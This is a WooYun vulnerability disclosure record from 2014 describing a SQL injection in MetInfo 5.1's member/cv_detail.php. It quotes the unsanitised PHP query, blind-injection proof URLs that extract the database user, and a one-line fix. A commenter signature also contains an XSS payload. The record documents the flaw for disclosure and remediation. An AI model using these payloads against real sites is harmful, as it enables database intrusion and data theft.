{"id": 1748, "wybug_id": "wooyun-2014-062879", "wybug_title": "MetInfo企业网站管理系统SQL注入漏洞三", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xfkxfk", "wybug_date": "2014-05-30 17:41", "wybug_open_date": "2014-08-28 17:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "数字类型注射", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-28：\t细节向公众公开  简要描述： MetInfo企业网站管理系统SQL注入漏洞三，无视GPC 详细说明：  MetInfo企业网站管理系统v5.1正式版文件/member/cv_detail.php\n<?phprequire_once 'login_check.php';require_once ROOTPATH.'member/index_member.php';$cv_list=$db->get_one(\"select * from $met_cv where id='$id'\");if(!$cv_list){okinfo('cv.php',$lang_NoidJS);}$query = \"SELECT * FROM $met_parameter where lang='$lang' and module=6  order by no_order\";$result = $db->query($query);while($list= $db->fetch_array($result)){$value_list=$db->get_one(\"select * from $met_plist where paraid=$list[id] and listid=$id \");//问题在这里if($list[type]==5){\t$value_list[info]=\"<a href='$value_list[info]'>$value_list[info]</a>\";}$list[content]=$value_list[info];$cv_para[]=$list;}$mfname='cv_detail';include template('member');footermember();?>\n从代码中看到\n$value_list=$db->get_one(\"select * from $met_plist where paraid=$list[id] and listid=$id \");\nid没有加任何保护，直接进入SQL语句，导致注入   漏洞证明：  1、登陆后，在线应聘/job/cv.php，添加一个简历2、在管理简历信息——查看简历信息时id存在注入http://localhost/metinfo5.1/member/cv_detail.php?lang=cn&id=1 AND ascii( substring( user( ) , 1, 1 ) ) >113——正常返回\n\nhttp://localhost/metinfo5.1/member/cv_detail.php?lang=cn&id=1 AND ascii( substring( user( ) , 1, 1 ) ) >113——无信息返回\n\n证明user（）的第一个字符为r继续修改substring( user( ) , 1, 1 )中的第二个数字，2,3,4，然后在修改后面的ascii码值，进一步得到user（）=root同样方法进一步猜出其他数据。   修复方案：  加单引号保护即可   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-04 15:41 厂商回复： 对近期的MetInfo漏洞，一些需要较强的后台认证前提，对于此类漏洞，CNVD不再进行实例复现，根据代码原理进行认定（或本地复现），并由CNVD按以往处置联系渠道，向软件生产厂商长沙米拓信息技术有限公司集中通报。rank 10 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-30 17:46 |    \t\tAzui \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:10        | 用一只黑色铅笔画一出舞台默剧。)\t\t \n  今天是大喜日子。。？    \n     2014-05-30 18:04 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  大牛，佩服！！    \n     2014-05-30 18:11 |    \t\t网络小兵 \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | t00ls)\t\t \n  大牛啊    \n     2014-05-31 14:03 |    \t\t忆苦思甜 \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:25        )\t\t \n  大牛，佩服！！     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}